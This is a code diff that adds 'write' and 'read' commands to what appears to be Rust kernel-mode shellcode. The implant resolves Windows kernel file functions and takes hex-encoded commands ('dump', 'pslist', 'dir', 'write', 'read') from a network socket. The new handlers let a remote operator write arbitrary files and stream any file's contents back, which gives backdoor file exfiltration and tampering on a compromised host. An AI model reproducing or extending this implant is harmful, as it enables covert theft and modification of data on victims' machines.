@@ -85,6 +85,8 @@ unsafe fn shellcode_start() -> Result<(), ntdef::types::NTSTATUS> {
     (*fs_funcs).zw_close =                                  ntproc::find!("ZwClose");
     (*fs_funcs).ex_allocate_pool =                          ex_allocate_pool;
     (*fs_funcs).ex_free_pool_with_tag =                     (*tdi_ctx).funcs.ex_free_pool_with_tag;
+    (*fs_funcs).zw_write_file =                             ntproc::find!("ZwWriteFile");
+    (*fs_funcs).zw_read_file =                              ntproc::find!("ZwReadFile");
 
     let rtl_get_version: ntdef::functions::RtlGetVersion =  ntproc::find!("RtlGetVersion");
     let ps_terminate_system_thread: ntdef::functions::PsTerminateSystemThread = ntproc::find!("PsTerminateSystemThread");
@@ -134,6 +136,8 @@ unsafe fn shellcode_start() -> Result<(), ntdef::types::NTSTATUS> {
             let dump_cmd = [0x64u8, 0x75u8, 0x6du8, 0x70u8, 0x20u8];
             let pslist_cmd = [0x70u8, 0x73u8, 0x6cu8, 0x69u8, 0x73u8, 0x74u8, 0x0au8];
             let dir_cmd = [0x64u8, 0x69u8, 0x72u8, 0x20u8];
+            let write_cmd = [0x77u8, 0x72u8, 0x69u8, 0x74u8, 0x65u8, 0x20u8];
+            let read_cmd = [0x72u8, 0x65u8, 0x61u8, 0x64u8, 0x20u8];
             if ntdef::macros::RtlEqualMemory(buf as _, &echo_cmd as _, 5) == 1u32 {
                 let _ = socket.send((buf as *const u8).offset(5) as *const u8, buf_len - 5);
             } else if ntdef::macros::RtlEqualMemory(buf as _, &close_cmd as _, 6) == 1u32 {
@@ -236,7 +240,8 @@ unsafe fn shellcode_start() -> Result<(), ntdef::types::NTSTATUS> {
                 let mut dir_open_error: u32 = 0;
                 let mut handle: ntdef::types::HANDLE = scratch_buf as _;
                 let _ = match ntfs::open_directory(
-                    fs_funcs, (buf as *const u8).offset(4) as _, &mut handle as _) {
+                    fs_funcs, (buf as *const u8).offset(4) as _, &mut handle as _, 1460 as _
+                ) {
                         0 => 0,
                         _ => {
                             dir_open_error = 1 as _;
@@ -269,7 +274,60 @@ unsafe fn shellcode_start() -> Result<(), ntdef::types::NTSTATUS> {
                     let dir_open_error_msg = [0x65u8, 0x72u8, 0x72u8, 0x6fu8, 0x72u8, 0x20u8, 0x77u8, 0x69u8, 0x74u8, 0x68u8, 0x20u8, 0x73u8, 0x70u8, 0x65u8, 0x63u8, 0x69u8, 0x66u8, 0x69u8, 0x65u8, 0x64u8, 0x20u8, 0x64u8, 0x69u8, 0x72u8, 0x65u8, 0x63u8, 0x74u8, 0x6fu8, 0x72u8, 0x79u8, 0x0au8];
                     let _ = socket.send(&dir_open_error_msg as *const u8, 31);
                 }
-                
+            } else if ntdef::macros::RtlEqualMemory(buf as _, &write_cmd as _, 6) == 1u32 {
+                *(buf as *mut u8).offset((buf_len-1) as _) = 0x00u8; // null terminate instead of newline
+                let mut file_open_error: u32 = 0 as _;
+                let mut handle: ntdef::types::HANDLE = scratch_buf as _;
+                let _ = match ntfs::open_file(
+                    fs_funcs, (buf as *const u8).offset(6) as _, &mut handle as _, 1460 as _, 1
+                ) {
+                    0 => 0,
+                    _ => {
+                        file_open_error = 1 as _;
+                        1
+                    }
+                };
+                if file_open_error == 0 as _ {
+                    let status = ntfs::write_file(fs_funcs, handle, buf as _, buf_len as _);
+                    if status == 0 as _ {
+                        let write_success_msg = [0x77u8, 0x72u8, 0x69u8, 0x74u8, 0x65u8, 0x20u8, 0x73u8, 0x75u8, 0x63u8, 0x63u8, 0x65u8, 0x73u8, 0x73u8, 0x0au8];
+                        let _ = socket.send(&write_success_msg as *const u8, 14);
+                    } else {
+                        let write_failed_msg = [0x77u8, 0x72u8, 0x69u8, 0x74u8, 0x65u8, 0x20u8, 0x66u8, 0x61u8, 0x69u8, 0x6cu8, 0x65u8, 0x64u8, 0x0au8];
+                        let _ = socket.send(&write_failed_msg as *const u8, 13);                        
+                    }
+                    ntfs::close_handle(fs_funcs, handle);
+                } else {
+                    let file_open_error_msg = [0x65u8, 0x72u8, 0x72u8, 0x6fu8, 0x72u8, 0x20u8, 0x77u8, 0x68u8, 0x69u8, 0x6cu8, 0x65u8, 0x20u8, 0x6fu8, 0x70u8, 0x65u8, 0x6eu8, 0x69u8, 0x6eu8, 0x67u8, 0x20u8, 0x73u8, 0x70u8, 0x65u8, 0x63u8, 0x69u8, 0x66u8, 0x69u8, 0x65u8, 0x64u8, 0x20u8, 0x66u8, 0x69u8, 0x6cu8, 0x65u8, 0x0au8];
+                    let _ = socket.send(&file_open_error_msg as *const u8, 35);
+                }
+            } else if ntdef::macros::RtlEqualMemory(buf as _, &read_cmd as _, 5) == 1u32 {
+                *(buf as *mut u8).offset((buf_len-1) as _) = 0x00u8; // null terminate instead of newline
+                let mut file_open_error: u32 = 0 as _;
+                let mut handle: ntdef::types::HANDLE = scratch_buf as _;
+                let _ = match ntfs::open_file(
+                    fs_funcs, (buf as *const u8).offset(5) as _, &mut handle as _, 1460 as _, 0
+                ) {
+                    0 => 0,
+                    _ => {
+                        file_open_error = 1 as _;
+                        1
+                    }
+                };
+                if file_open_error == 0 as _ {
+                    let mut status: u32 = 2;
+                    let mut n_bytes_read: u32;
+                    while status == 2 as _ {
+                        (status, n_bytes_read) = ntfs::read_file(fs_funcs, handle, buf as _, 1460 as _);
+                        if status != 1 as _ {
+                            let _ = socket.send(buf as *const u8, n_bytes_read as _);
+                        }
+                    }
+                    ntfs::close_handle(fs_funcs, handle);
+                } else {
+                    let file_open_error_msg = [0x65u8, 0x72u8, 0x72u8, 0x6fu8, 0x72u8, 0x20u8, 0x77u8, 0x68u8, 0x69u8, 0x6cu8, 0x65u8, 0x20u8, 0x6fu8, 0x70u8, 0x65u8, 0x6eu8, 0x69u8, 0x6eu8, 0x67u8, 0x20u8, 0x73u8, 0x70u8, 0x65u8, 0x63u8, 0x69u8, 0x66u8, 0x69u8, 0x65u8, 0x64u8, 0x20u8, 0x66u8, 0x69u8, 0x6cu8, 0x65u8, 0x0au8];
+                    let _ = socket.send(&file_open_error_msg as *const u8, 35);
+                }
             } else {
                 let invalid_cmd = [0x69u8, 0x6eu8, 0x76u8, 0x61u8, 0x6cu8, 0x69u8, 0x64u8, 0x20u8, 0x63u8, 0x6fu8, 0x6du8, 0x6du8, 0x61u8, 0x6eu8, 0x64u8, 0x0au8];
                 let _ = socket.send(&invalid_cmd as *const u8, 16 as _);
